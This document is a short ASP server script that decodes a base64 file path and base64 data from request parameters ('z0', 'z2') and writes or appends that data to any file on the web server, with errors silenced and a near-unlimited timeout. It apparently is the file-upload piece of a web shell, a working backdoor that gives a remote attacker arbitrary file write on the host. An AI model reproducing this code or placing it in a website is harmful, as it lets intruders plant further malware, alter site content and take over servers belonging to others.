<%

On Error Resume Next
Server.ScriptTimeout = 9999999

Function Base64Decode(byVal strIn)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set objNode = objXML.CreateElement("base64")
    objNode.dataType = "bin.base64"
    objNode.text = strIn
    Base64Decode = objNode.nodeTypedValue
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Dim szFilePath, szb64Data, rawData, cleanB64, binaryData
szFilePath = Base64Decode(Request("z0"))
szb64Data = Base64Decode(Request("z1"))

rawData = Request("z2")
cleanB64 = Replace(Replace(rawData, vbCr, ""), vbLf, "")

binaryData = Base64Decode(cleanB64)

Dim objStream
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1 ' adTypeBinary

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")

If fso.FileExists(szFilePath) Then
    objStream.Open
    objStream.LoadFromFile szFilePath
    objStream.Position = objStream.Size
Else
    objStream.Open
ENd If

objStream.Write binaryData
objStream.SaveToFile szFilePath, 2

If Err.Number = 0 Then
    Response.Write "1"
Else
    Response.Write "0"
End If

Set objStream = Nothing
Set fso = Nothing

%>